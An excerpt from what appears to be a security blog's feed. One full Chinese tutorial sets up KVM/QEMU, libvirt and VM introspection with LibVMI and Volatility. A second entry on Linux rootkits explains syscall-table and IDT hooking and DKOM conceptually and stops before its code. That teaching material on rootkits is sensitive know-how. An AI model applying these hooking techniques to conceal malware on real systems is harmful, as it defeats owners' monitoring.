&lt;h3 id=&quot;Ox01-虚拟机创建KVM-QEMU&quot;&gt;&lt;a href=&quot;#Ox01-虚拟机创建KVM-QEMU&quot; class=&quot;headerlink&quot; title=&quot;Ox01 虚拟机创建KVM/QEMU&quot;&gt;&lt;/a&gt;Ox01 虚拟机创建KVM/QEMU&lt;/h3&gt;&lt;p&gt;Kvm需要CPU的支持（Intel VT 或者 AMD SVM)，在安装KVM之前，可先检查CPU是否支持硬件虚拟化技术。基于Intel的系统，可运行 ‘grep vmx /proc/cpuinfo’ 查看是否含有vmx的关键字，如果有，则表示支持；基于AMD的系统，可运行 ‘grep svm /proc/cpuinfo’ 查看是否含有svm的关键字。&lt;br&gt;另外，CPU若支持硬件虚拟化，还得确保BLOS开启了VT选项（有些厂商默认是禁用的，如thinkpad t450). 可以下载 cpu-checker 工具（apt-get install cpu-checker)，之后运行kvm-ok， 如果提示 kvm acceleration can not be used，则可能是blos禁用了kvm虚拟化，在blos设置中开启即可。&lt;/p&gt;
&lt;p&gt;可执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;modprobe kvm 
modprobe kvm_intel 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开启内核自带的kvm&lt;/p&gt;
&lt;p&gt;关于源码安装kvm-kmod以及qemu-kvm的详细过程可参考 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/01/01/kvm-qemu-bytalk/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt; 文章。kvm-kmod安装成功后，运行lsmod | grep kvm， 会显示两个module:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kvm_intel             137721  3 
kvm                   415549  1 kvm_intel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;qemu-kvm安装成功后会在/your-confiure-location/bin/qemu-system-x86_64等可执行文件。&lt;/p&gt;
&lt;p&gt;安装完KVM/QEMU后，创建虚拟机的时候，虚拟机的网络方式是比较关心的问题，KVM/QEMU有两种网络配置方式。&lt;/p&gt;
&lt;p&gt;其一，用户模式（User Networking): 即NAT方式，也是默认的网络模式。让虚拟机访问主机、互联网或本地网络上的资源的简单方法，但是不能从网络或其他的客户机访问客户机。既然无法访问客户机，那宿主机与客户机该如何传输文件呢？默认的，客户机得到的ip空间为10.0.2.0/24，宿主机提供了ip为10.0.2.2的地址让虚拟机访问。可以ssh到宿主机(10.0.2.2)，用scp来拷贝文件。&lt;/p&gt;
&lt;p&gt;其二，桥接模式（Bridge Networking): 这种模式允许客户机就像一台独立的主机一样拥有网络。这种方式要比用户网络复杂一些，但是设置好后客户机与互联网，客户机与主机之间的通信都很容易。桥接网络需要网卡支持，一般的有线网卡都支持，绝大部分的无线网卡都不支持。&lt;/p&gt;
&lt;p&gt;NAT方式是KVM/QEMU提供的默认方式，要设置桥接模式，首先在宿主机上安装桥接相关的包，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install bridge-utils. 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改/etc/network/interfaces&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;auto lo
iface lo inet loopback
auto eth0
iface eth0 inet manual
auto br0
iface br0 inet dhcp
   bridge_ports eth0
   bridge_stp off
   bridge_fd 9
   bridge_hello 2
   bridge_maxwait 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/init.d/networking restart
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置好后，可运行brctl show命令，会显示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bridge name      bridge id              STP enabled interfaces
br0              8000.68f728eddb0d      no          eth0
                                              vnet0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后在创建虚拟机的时候可添加-net nic -net tap参数，如&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/local/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -net nic -net tap -monitor stdio    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后创建的虚拟机便工作在网桥模式中。&lt;/p&gt;
&lt;h3 id=&quot;0x02-虚拟机管理Libvirt&quot;&gt;&lt;a href=&quot;#0x02-虚拟机管理Libvirt&quot; class=&quot;headerlink&quot; title=&quot;0x02 虚拟机管理Libvirt&quot;&gt;&lt;/a&gt;0x02 虚拟机管理Libvirt&lt;/h3&gt;&lt;p&gt;除了用qemu命令行的方式创建与管理虚拟机，也可将一些命令行参数保存为xml配置文件，用libvirt来管理。libvirt是一套管理虚拟机的工具，包括管理虚拟机的API、一个守护进程（libvirtd)和一个命令行工具（virsh). Libvirt 的主要目标是提供一个单一途径以管理多种不同虚拟化方案已经虚拟化主机，包括KVM/QEMU,Xen,LXC等。安装libvirt后，会产生libvirtd进程以及virsh工具，要利用libvirt做开发，可调用其中的API。libvirt, libvirtd 以及virsh的关系如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/libvirt-internal.png&quot; alt=&quot;libvirt-internal&quot;&gt;&lt;/p&gt;
&lt;p&gt;详细介绍可参考：&lt;a href=&quot;http://libvirt.org/internals.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvirt internals&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;安装libvirt: &lt;/p&gt;
&lt;p&gt;先安装libvirt所依赖的包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install libnl-dev libxml2 libxml2-dev  libpciaccess-dev libyajl-dev libdevmapper-dev libgnutls-dev
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如出现以下错误，都可以检查上述这些包是否安装好&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error: Could not find libxml2 anywhere

error: You must install the GnuTLS library in order to compile and run libvirt

error: You must install device-mapper-devel/libdevmapper &amp;gt;= 1.0.0 to compile libvirt

error: libnl-devel &amp;gt;= 1.1 is required for macvtap support
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载 libvirt1.3.2.tar.gz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar xvf libvirt1.3.2.tar.gz
./configure
make &amp;amp;&amp;amp; make install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装完成后，执行ldconfig同步链接库，否则会出现以下错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;virsh: error while loading shared libraries: libvirt.so.0: cannot open shared object file: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行检查libvirt安装成功&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;which libvirtd
libvirtd –version
which virsh
virsh –version
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;若出现此类错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error: Failed to reconnect to the hypervisor
error: no valid connection
error: Failed to connect socket to &amp;apos;/usr/local/var/run/libvirt/libvirt-sock&amp;apos;: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;则很有可能是libvirtd进程没有开启，这时需要手动开启libvirtd,执行libvirtd -d 即可。(libvirtd具体参数可参考：&lt;a href=&quot;http://linux.die.net/man/8/libvirtd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvirtd manual&lt;/a&gt; ）&lt;/p&gt;
&lt;p&gt;另外注意，libvirt从1.3版本后增加了virtlogd特性，需要执行virtlogd -d手动开启virtlogd进程（virtlogd具体参数可参看：&lt;a href=&quot;https://www.mankier.com/8/virtlogd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;virtlogd manual&lt;/a&gt; ）. 否则会出现以下错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error: Failed to connect socket to &amp;apos;/usr/local/var/run/libvirt/virtlogd-sock&amp;apos;: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装好libvirt后，便可配置好xml文件，用virsh来管理。具体virsh命令这里不做介绍，可参考其中一个配置文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;domain type=&amp;apos;kvm&amp;apos;&amp;gt;
&amp;lt;name&amp;gt;ubuntudemo&amp;lt;/name&amp;gt;&amp;lt;!--虚拟机名称--&amp;gt;
&amp;lt;memory&amp;gt;1048576&amp;lt;/memory&amp;gt;&amp;lt;!--最大内存，单位KB--&amp;gt;
&amp;lt;currentMemory&amp;gt;1048576&amp;lt;/currentMemory&amp;gt;&amp;lt;!--可用内存，单位k--&amp;gt;
&amp;lt;uuid&amp;gt;87d5b3d2-3618-4a59-9efb-aa869ff34999&amp;lt;/uuid&amp;gt;

&amp;lt;vcpu&amp;gt;1&amp;lt;/vcpu&amp;gt;&amp;lt;!--虚拟cpu个数--&amp;gt;
&amp;lt;os&amp;gt;
    &amp;lt;type arch=&amp;apos;x86_64&amp;apos;,machine=&amp;apos;pc&amp;apos;&amp;gt;hvm&amp;lt;/type&amp;gt;
    &amp;lt;boot dev=&amp;apos;hd&amp;apos;/&amp;gt;&amp;lt;!--光盘启动--&amp;gt;
&amp;lt;/os&amp;gt;
&amp;lt;features&amp;gt;
    &amp;lt;acpi/&amp;gt;
    &amp;lt;apic/&amp;gt;
    &amp;lt;pae/&amp;gt;
&amp;lt;/features&amp;gt;
&amp;lt;clock offset=&amp;apos;localtime&amp;apos;/&amp;gt;
&amp;lt;on_poweroff&amp;gt;destroy&amp;lt;/on_poweroff&amp;gt;
&amp;lt;on_reboot&amp;gt;restart&amp;lt;/on_reboot&amp;gt;
&amp;lt;on_crash&amp;gt;destroy&amp;lt;/on_crash&amp;gt;
&amp;lt;devices&amp;gt;
    &amp;lt;emulator&amp;gt;/usr/bin/qemu&amp;lt;/emulator&amp;gt; &amp;lt;!--先创建好软链接   ln -s /use/local/qemukvm1.1.2/bin/qemu-system-x86_64 /usr/bin/qemu--&amp;gt;
    &amp;lt;disk type=&amp;apos;file&amp;apos; device=&amp;apos;disk&amp;apos;&amp;gt;
        &amp;lt;driver name=&amp;apos;qemu&amp;apos; type=&amp;apos;qcow2&amp;apos;/&amp;gt;
        &amp;lt;source file=&amp;apos;/home/os.img/server12041.img&amp;apos;/&amp;gt;&amp;lt;!--目的镜像路径--&amp;gt;
        &amp;lt;target dev=&amp;apos;vda&amp;apos; bus=&amp;apos;virtio&amp;apos;/&amp;gt;
    &amp;lt;/disk&amp;gt;

    &amp;lt;interface type=&amp;apos;bridge&amp;apos;&amp;gt;&amp;lt;!--虚拟机网络连接方式--&amp;gt;
        &amp;lt;source bridge=&amp;apos;br0&amp;apos;/&amp;gt;&amp;lt;!--当前主机网桥的名称--&amp;gt;
        &amp;lt;mac address=&amp;quot;00:16:3e:5d:aa:a8&amp;quot;/&amp;gt;&amp;lt;!--为虚拟机分配mac地址，务必唯一，否则dhcp获得同样ip,引起冲突--&amp;gt;
    &amp;lt;/interface&amp;gt;
    &amp;lt;input type=&amp;apos;mouse&amp;apos; bus=&amp;apos;ps2&amp;apos;/&amp;gt;
    &amp;lt;!--vnc方式登录，端口号自动分配，自动加1，可以通过virsh vncdisplay ubuntudemo来查询（实际端口为显示结果+5900）--&amp;gt; 
    &amp;lt;graphics type=&amp;apos;vnc&amp;apos; port=&amp;apos;-1&amp;apos; autoport=&amp;apos;yes&amp;apos; listen=&amp;apos;0.0.0.0&amp;apos; keymap=&amp;apos;en-us&amp;apos;/&amp;gt;
&amp;lt;/devices&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x03-虚拟机监控Libvmi&quot;&gt;&lt;a href=&quot;#0x03-虚拟机监控Libvmi&quot; class=&quot;headerlink&quot; title=&quot;0x03 虚拟机监控Libvmi&quot;&gt;&lt;/a&gt;0x03 虚拟机监控Libvmi&lt;/h3&gt;&lt;p&gt;Libvmi是一套能从底层二进制信息重构虚拟机上层语义的C语言API。由于hypervisor(VMM)获取的全是客户机的二进制比特，用户为了从外部（比如宿主机)监控客户机的行为需要理解客户机上层的语义，比如客户机正在运行的进程列表、模块列表等信息，这种二进制到上层语义之间的gap称之为语义鸿沟（semantic gap)，从外部监控客户机的行为称之为虚拟机自省（VM Introspection）。 Libvmi提供的API，能够读取物理内存、虚拟内存、符号表（System.map）、暂停/打开虚拟机、接收内存与寄存器事件的通知等，让用户能很方便的构建插件，来读取进程列表、模块列表等信息（大部分linux原生监控工具都可以通过libvmi来构建). &lt;/p&gt;
&lt;p&gt;Libvmi目前支持Intel,AMD64以及ARM系统结构，支持的虚拟机平台包括XEN与KVM/QEMU，支持的被监控系统类型包括windows和linux. Libvmi从Xenaccess发展而来，要了解其详细原理，可参考论文&lt;a href=&quot;https://www.acsac.org/2007/papers/138.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Secure and Flexible Monitoring of Virtual Machines&lt;/a&gt;以及官方主页&lt;a href=&quot;http://libvmi.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvmi&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;安装libvmi:&lt;/p&gt;
&lt;p&gt;先安装其依赖的包，注，这里针对KVM/QEMU，关于XEN依赖的包，会有所不同，可参考&lt;a href=&quot;http://libvmi.com/docs/gcode-install.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libvmi-installation&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install automake autoconf
apt-get install libtool
apt-get install flex bison
apt-get install check
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载libvmi-0.10.1.tar.gz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar xvf libvmi-0.10.1.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装    &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd libvmi-0.10.1
./autogen.sh
./congfigure
make 
make install
ldconfig
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;libvmi提供了很多plugin examples在/libvmi/examples文件夹中，&lt;br&gt;要运行其中的plugin（比如process-list，列举客户机中进程信息，类似linux的原生ls命令), 首先要找出客户机符号表中的一些偏移信息. libvmi提供了获取偏移信息的工具在/libvmi/tools/linux-offset-finder/ 文件夹中，将其拷贝到虚拟机中，make编译，生成了一个内核模块findoffset.ko，执行insmod findoffset.ko将其插入内核中，&lt;br&gt; 再执行dmesg 将得到的偏移信息，如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ostype = &amp;quot;Linux&amp;quot;;
sysmap = &amp;quot;/boot/System.map-3.2.0-29-generic&amp;quot;;
linux_name = 0x470;
linux_tasks = 0x248;
linux_mm=0x280;
linux_pid=0x2bc;
linux_pgd=0x58;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写进宿主机的/libvmi/etc/libvmi-example.conf中，将libvmi-example.conf拷贝到/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中,注，这里libvmi会在/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中读取偏移信息。另外，这里的sysmap路径是host主机的路径，需要把guest中的System.map文件拷贝到host主机上。(还发现一个问题，虚拟机的名字不能全以数字命名，比如120432,不然在读取libvmi.conf配置文件时会出错).&lt;/p&gt;
&lt;p&gt;之后运行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/libvmi/examples/process-list ubuntudemo 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里ubuntudemo是创建的虚拟机名字。以下是列出的部分信息：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Process listing for VM ubuntudemo (id=3)
Next list entry is at: ffff88003d638248
[    0] swapper/0 (struct addr:ffffffff81c0d020)
[    1] init (struct addr:ffff88003d638000)
[    2] kthreadd (struct addr:ffff88003d639700)
[    3] ksoftirqd/0 (struct addr:ffff88003d63ae00)
[    6] migration/0 (struct addr:ffff88003d658000)
[    7] watchdog/0 (struct addr:ffff88003d659700)
[    8] cpuset (struct addr:ffff88003d65ae00)
[    9] khelper (struct addr:ffff88003d65c500)
[   10] kdevtmpfs (struct addr:ffff88003d65dc00)
[   11] netns (struct addr:ffff88003d698000)
[   12] sync_supers (struct addr:ffff88003d699700)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Libvmi提供的plugins有限，用户可根据需要编写，也可利用取证工具volatlity做更高层次语义的分析。Libvmi支持python绑定，提供了与volatility绑定的接口，具体可见下文。&lt;/p&gt;
&lt;h3 id=&quot;0x04-虚拟机监控Volatility&quot;&gt;&lt;a href=&quot;#0x04-虚拟机监控Volatility&quot; class=&quot;headerlink&quot; title=&quot;0x04 虚拟机监控Volatility&quot;&gt;&lt;/a&gt;0x04 虚拟机监控Volatility&lt;/h3&gt;&lt;p&gt;Volatility是一个用python编写的内存分析工具，与libvmi（利用sysystem.map符号表信息)不同的是，volatility利用可执行文件elf中的调试信息（dwarf格式）以及system.map符号表信息来获取更丰富的变量和函数语义。其支持windows， linux以及mac。 文中以Linux为例。&lt;/p&gt;
&lt;p&gt;Get Started:&lt;/p&gt;
&lt;p&gt;下载volatility包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/volatilityfoundation/volatility.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建Linux profile&lt;/p&gt;
&lt;p&gt;profile是个zip文件，包含内核数据结构以及调试信息，也就是dwarf文件（volatility称之为vtypes)与system.map的压缩包。&lt;/p&gt;
&lt;p&gt;volatility提供了一个内核模块在/volatility/tools/linux文件夹下来获取vtypes信息，将文件夹内容拷贝到要分析的客户机中，编译make，生成module.dwarf文件。在此之前请确保客户机中以及安装dwarfdump (apt-get install dwarfdump）。之后执行 head module.dwarf，会显示以下内容:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.debug_info

&amp;lt;0&amp;gt;&amp;lt;0+11&amp;gt;&amp;lt;DW_TAG_compile_unit&amp;gt; DW_AT_producer&amp;lt;GNU C 4.6.3&amp;gt; DW_AT_language&amp;lt;DW_LANG_C89&amp;gt;.....

&amp;lt;1&amp;gt;&amp;lt;45&amp;gt;&amp;lt;DW_TAG_typedef&amp;gt; DW_AT_name&amp;lt;__s8&amp;gt; DW_AT_decl_file&amp;lt;1 include/asm-generic/int-ll64.h&amp;gt;.....
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成&lt;/p&gt;
&lt;p&gt;接着将module.dwarf文件以及/boot/System.map-3.2.0-99-generic 文件（不同系统文件名不同）压缩成一个zip文件，如Ubuntu1204.zip。执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-99-generic
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用profile&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python vol.py --info | grep Linux 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; 这时会显示之前创建的profile名，Linuxubuntu1204x64.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;LinuxUbuntu1204x64    - A Profile for Linux Ubuntu1204 x64 &amp;lt;=== This is the one we just created
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;绑定libvmi的python接口&lt;/p&gt;
&lt;p&gt;在./volatility/plugins/addrspaces 有针对不同内存快照的物理地址空间，如vmware.py,lime.py，crash.py等。libvmi则提供了pyvmi接口，在/libvmi/tools/pyvmi文件夹中有个pyvmiaddressspace.py文件可供volatility使用，（若需要自己编写python程序，则需要build pyvmi，build过程可参见其中的README文件，若出现编译错误，请确保安装 apt-get install build-essentials, apt-get install python2.7-dev).&lt;br&gt;将pyvmiaddressspace.py文件拷贝至./volatility/plugins/addrespaces文件夹中便可以利用volatility的plugins来分析虚拟机的内存了。以linux_pslist plugin为例，执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python vol.py -l vmi://ubuntudemo --profile=Linuxubuntu1204x64 linux_pslist  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;若出现distorm3（反编译库)相关错误，请确保已经安装distorm3&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install python-pip
pip install distorm3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;绑定pyvmi接口后，volatility所有的plugins都可以用来分析虚拟机内存。 &lt;/p&gt;
&lt;p&gt;完&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;如转载本文请注明出处: &lt;a href=&quot;http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/03/30/virt-setup-analysis/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] &lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;0x0A-References&quot;&gt;&lt;a href=&quot;#0x0A-References&quot; class=&quot;headerlink&quot; title=&quot;0x0A References&quot;&gt;&lt;/a&gt;0x0A References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://libvmi.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Libvmi&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://libvirt.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Libvirt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/volatilityfoundation/volatility/wiki&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Volatility wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.acsac.org/2007/papers/138.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Secure and Flexible Monitoring of Virtual Machines&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控。可根据自身需要阅读相关内容。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x00 全文环境 &lt;/li&gt;
&lt;li&gt;0x01 虚拟机创建KVM/QEMU &lt;/li&gt;
&lt;li&gt;0x02 虚拟机管理Libvirt&lt;/li&gt;
&lt;li&gt;0x03 虚拟机监控Libvmi&lt;/li&gt;
&lt;li&gt;0x04 虚拟机监控Volatility&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="virtualization" scheme="http://yoursite.com/categories/virtualization/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Binary" scheme="http://yoursite.com/tags/Binary/"/>
    
      <category term="Virtualization" scheme="http://yoursite.com/tags/Virtualization/"/>
    
      <category term="KVM" scheme="http://yoursite.com/tags/KVM/"/>
    
      <category term="QEMU" scheme="http://yoursite.com/tags/QEMU/"/>
    
      <category term="Libvmi" scheme="http://yoursite.com/tags/Libvmi/"/>
    
      <category term="Volatility" scheme="http://yoursite.com/tags/Volatility/"/>
    
  </entry>
  
  <entry>
    <title>A Comprehensive Tutorial of Rootkit</title>
    <link href="http://yoursite.com/blog/2016/03/07/rootkit-tutorial/"/>
    <id>http://yoursite.com/blog/2016/03/07/rootkit-tutorial/</id>
    <published>2016-03-08T02:25:37.000Z</published>
    <updated>2016-04-28T19:53:55.000Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x1: Definition of rootkit &lt;/li&gt;
&lt;li&gt;0x2: Classification of Rootkit&lt;/li&gt;
&lt;li&gt;0x3: Hooking(Kernel Object Hooking) Rootkit&lt;/li&gt;
&lt;li&gt;0x4: DKOM Rootkit&lt;/li&gt;
&lt;li&gt;0x5: Rootkit Objectives&lt;/li&gt;
&lt;li&gt;0x6: Example-Module Hiding&lt;/li&gt;
&lt;li&gt;0x7: Example-Process Hiding&lt;/li&gt;
&lt;li&gt;0x8: Rootkit Samples&lt;/li&gt;
&lt;li&gt;0x9: Rootkit Resources&lt;/li&gt;
&lt;li&gt;0xA: Acknowledgement&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;0x1-Definition-of-rootkit&quot;&gt;&lt;a href=&quot;#0x1-Definition-of-rootkit&quot; class=&quot;headerlink&quot; title=&quot;0x1: Definition of rootkit&quot;&gt;&lt;/a&gt;0x1: Definition of rootkit&lt;/h3&gt;&lt;p&gt;The term &lt;em&gt;rootkit&lt;/em&gt; originates from the composition of the individual terms root, referring to the highest privilege of access that can be obtained in a traditional Unix-based operating system, and &lt;em&gt;kit&lt;/em&gt;, referring to a set of programs that are designed to exploit a target system, gain root access and then maintain it without tripping any alarms. &lt;/p&gt;
&lt;p&gt;简而言之，rootkit是攻击者向计算机系统中植入的，能够隐藏自身踪迹并保留超级用户权限的恶意程序。与worms，virus不同的是，rootkit基于攻击者已经拿到root权限之后对系统进行破坏。rootkit会尽可能通过隐藏文件、进程、模块、进程等信息避免被监控程序检测。&lt;/p&gt;
&lt;h3 id=&quot;0x2-Classification-of-Rootkit&quot;&gt;&lt;a href=&quot;#0x2-Classification-of-Rootkit&quot; class=&quot;headerlink&quot; title=&quot;0x2: Classification of Rootkit&quot;&gt;&lt;/a&gt;0x2: Classification of Rootkit&lt;/h3&gt;&lt;p&gt;早期的rootkit主要为应用级rootkit，应用级rootkit主要通过替换login、ps、ls、netstat等系统工具,或者修改一些系统配置文件、脚本来实现隐藏及后门. 然而应用层rootkit比较容易检测，比如基于ring 3的chkrootkit检测工具。后期逐渐演变成内核rootkit,hypervisor rootkit以及硬件级rootkit. 内核rootkit可分为hooking rootkit以及DKOM rootkit。 下面就先来具体介绍这两种kernel rootkit。 hypervisor以及硬件级rootkit本文不做具体介绍，想了解更详细的rootkit分类，可参考这篇文章：&lt;a href=&quot;http://blog.invisiblethings.org/papers/2006/rutkowska_malware_taxonomy.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introducing Stealth Malware Taxonomy
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x3-Hooking-Kernel-Object-Hooking-Rootkit&quot;&gt;&lt;a href=&quot;#0x3-Hooking-Kernel-Object-Hooking-Rootkit&quot; class=&quot;headerlink&quot; title=&quot;0x3: Hooking(Kernel Object Hooking) Rootkit&quot;&gt;&lt;/a&gt;0x3: Hooking(Kernel Object Hooking) Rootkit&lt;/h3&gt;&lt;p&gt;Hooking rootkit 主要基于lkm(loadable kernel module)技术，以可加载内核模块的形式通过系统提供的接口加载到内核空间，成为内核的一部分，进而通过hook系统调用等技术实现隐藏、后门功能，这时，rootkit便是内核的一个模块。&lt;/p&gt;
&lt;p&gt;注：lkm is an object file that contains code to extend the running kernel, or so-called base kernel, of an operating system. lkm中文名为可加载内核模块，主要作用是用来扩展linux的内核功能。lkm的优点在于可以动态地加载到内存中，无须重新编译内核, 所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于rootkit技术当中。关于lkm更多的知识，可参考&lt;a href=&quot;https://www.thc.org/papers/LKM_HACKING.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Complete Linux Loadable Kernel Modules&lt;/a&gt;, 文章中也有与系统调用劫持相关的代码分析，下文会继续提到。lkm只是hooking rootkit的存在形式，而真正的技术在于如何hooking. &lt;/p&gt;
&lt;p&gt;什么是hooking ? 来自wekipedia的解释： the term hooking covers a range of techniques used to alter or augment the behavior of an operating system, of applications, or of other software components by intercepting function calls or messages or events passed between software components. Code that handles such intercepted function calls, events or messages is called a “hook”.  假如正常执行的情况是 Funtion A -&amp;gt; Funtion B, 经过hooking之后的执行就变为 Funtion A -&amp;gt; Hook -&amp;gt; Funtion B. &lt;/p&gt;
&lt;p&gt;Hooking rootkit主要的hook对象是系统调用，也包括VFS函数劫持(如adore-ng),下文会提到。当应用程序发起系统调用(比如 open()打开文件)时，整个程序控制流就像这样：&lt;/p&gt;
&lt;p&gt;1). 触发中断，然后程序在中断处理器（interrupt handler)定义的中断中继续执行。在Linux上，INT 80指令用来触发中断。&lt;/p&gt;
&lt;p&gt;这时，rootkit可以用自己的函数替换内核的中断处理器。这需要修改IDT(Interrupt Descriptor Table). 具体修改代码下文还会继续提到。 &lt;/p&gt;
&lt;p&gt;2). 中断处理器在syscall table中查询被请求的syscall的地址，将执行跳转到该地址中。&lt;/p&gt;
&lt;p&gt; a 这时，rootkit可以修改中断处理器而使用另一个syscall table, 这种类型的rootkit相对较少，可参考 Suckit， 文章&lt;a href=&quot;http://phrack.org/archives/issues/58/7.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Phrack issue 58, article 0x07 (“Linux on-the-fly kernel patching without LKM”&lt;/a&gt;有具体描述.&lt;br&gt;这种方式属于DKOM rootkit, 下文会详细讲解。&lt;/p&gt;
&lt;p&gt; b 也可以只修改syscall table的入口地址，将其替换为rootkit自己的函数. 大部分的rootkit都采取这种方式，如adore-ng, knark, synapsis等。&lt;/p&gt;
&lt;p&gt;3). 执行系统调用函数， 控制权返回到应用程序。&lt;br&gt;这时，rootkit也可以重写系统调用函数，在函数起始处放置jump，跳转到自己的函数中。&lt;/p&gt;
&lt;p&gt;但很少有rootkit采用这种方法。&lt;/p&gt;
&lt;p&gt;对于2).b 类型的rootkit， 可参考以下代码&lt;/p&gt;
